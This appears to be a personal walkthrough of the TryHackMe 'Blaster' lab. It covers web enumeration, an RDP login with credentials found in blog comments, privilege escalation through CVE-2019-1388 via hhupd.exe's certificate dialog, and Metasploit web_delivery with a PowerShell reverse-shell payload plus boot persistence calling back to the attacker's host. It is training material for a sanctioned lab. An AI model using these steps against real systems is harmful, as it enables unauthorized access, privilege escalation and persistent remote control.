# Blaster
Throughout this room, we'll be looking at alternative modes of exploitation without the use of Metasploit or really exploitation tools in general beyond nmap and dirbuster. To wrap up the room, we'll be pivoting back to these tools for persistence and additional steps we can take. Without further delay, let's deploy our target machine!

## Activate forward scanners and launch proton torpedoes
Now that we've launched our target, let's perform some basic enumeration of the services running on it!
- Command : `nmap -Pn -sV -sC 10.10.101.143`

![Pasted image 20251008223451.png](thm_pics/Pasted%20image%2020251008223451.png)

What hidden directory do we discover?
- Command : `gobuster dir -u http://10.10.101.143 -w /usr/share/wordlists/dirb/common.txt`
- found nothing
- maybe use another wordlist : `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
- this one contains more list than common.txt

![Pasted image 20251008224641.png](thm_pics/Pasted%20image%2020251008224641.png)

- Answer : **retro**

Navigate to our discovered hidden directory, what potential username do we discover?

![Pasted image 20251008224806.png](thm_pics/Pasted%20image%2020251008224806.png)

- Answer : Wade

Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

![Pasted image 20251008225226.png](thm_pics/Pasted%20image%2020251008225226.png)

- i clicked on Comments RSS, which gives me the file below

![Pasted image 20251008225156.png](thm_pics/Pasted%20image%2020251008225156.png)

- Answer : parzival

Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?
Command : `rdesktop -u Wade -p 'parzival' 10.10.101.143`

![Pasted image 20251008225653.png](thm_pics/Pasted%20image%2020251008225653.png)

## Breaching the Control Room
Now that we've gained access to our target system, let's see if we can find a way to escalate. To start, let's scout around the system to see if we can find anything of interest.

When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?
Hint : _CVE-2019–1388_

Looks like an **executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well** after testing it. What is the name of this executable?

![Pasted image 20251008230957.png](thm_pics/Pasted%20image%2020251008230957.png)

- hhupd

Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!
- right click hhupd.exe file and **run as administrator**

![Pasted image 20251008231700.png](thm_pics/Pasted%20image%2020251008231700.png)

- then click **"Show information about the publisher's cert"**

![Pasted image 20251008231821.png](thm_pics/Pasted%20image%2020251008231821.png)

- click the link issued by

![Pasted image 20251008232239.png](thm_pics/Pasted%20image%2020251008232239.png)

- click settings, file, save as
- In the file name field, input **c:\windows\system32\*.***
- scroll through and find cmd, right click and run as admin

![Pasted image 20251008232911.png](thm_pics/Pasted%20image%2020251008232911.png)

- next, find root.txt
- Command : `dir C:\root.txt /s /b 2>nul`

![Pasted image 20251008233349.png](thm_pics/Pasted%20image%2020251008233349.png)

![Pasted image 20251008233515.png](thm_pics/Pasted%20image%2020251008233515.png)

## Adoption into the collective
let's return to our exploitation tools so that we can gain remote shell access and persistence

Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of **payload delivery**! For this, we'll be using the **script web delivery exploit within Metasploit**. Launch Metasploit now and select '`exploit/multi/script/web_delivery`' for use.

First, let's set the target to PSH (PowerShell). Which target number is PSH?

![Pasted image 20251008233948.png](thm_pics/Pasted%20image%2020251008233948.png)

- target number = 2
- set payload = **windows/meterpreter/reverse_http**
- then type : **"run -j"**

![Pasted image 20251008235109.png](thm_pics/Pasted%20image%2020251008235109.png)

- it says "run the following command on the target machine"
- Then i proceed to run that in powershell
- **RUN in admin's shell, not normal user**

![Pasted image 20251009001137.png](thm_pics/Pasted%20image%2020251009001137.png)

![Pasted image 20251009001243.png](thm_pics/Pasted%20image%2020251009001243.png)

Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup.
- Command : `run persistence -X`

Run this command now with options that allow it to connect back to your host machine should the system reboot**. **Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice**.** Congrats, you've now gain full control over the remote host and have established persistence for further operations!

![[Pasted image 20251009001723.png]]

- so i use : windows/local/persistence module instead
- set LPORT 6789, LHOST = 10.23.125.244
- set payload windows/meterpreter/reverse_tcp

![Pasted image 20251009001920.png](thm_pics/Pasted%20image%2020251009001920.png)

